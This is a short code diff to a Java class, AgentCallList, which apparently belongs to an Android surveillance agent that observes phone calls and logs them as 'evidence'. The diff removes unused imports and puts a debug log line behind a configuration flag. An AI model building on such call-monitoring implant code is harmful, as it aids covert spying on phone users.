@@ -9,21 +9,17 @@
 
 package com.android.service.agent;
 
-import java.util.Date;
-
-import android.provider.CallLog;
 import android.util.Log;
 
 import com.android.service.Call;
 import com.android.service.LogR;
-
+import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerCall;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
-import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
 public class AgentCallList extends AgentBase implements Observer<Call> {
@@ -60,7 +56,7 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 		final String note = "no notes";
 
 		
-		Log.d("QZ", TAG + " (notification): " + call);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (notification): " + call);
 		if (call.isOngoing()) {
 			// Arrivano due call, in uscita, una con il number, l'altra senza.
 			if (call.getNumber().length() > 0) {
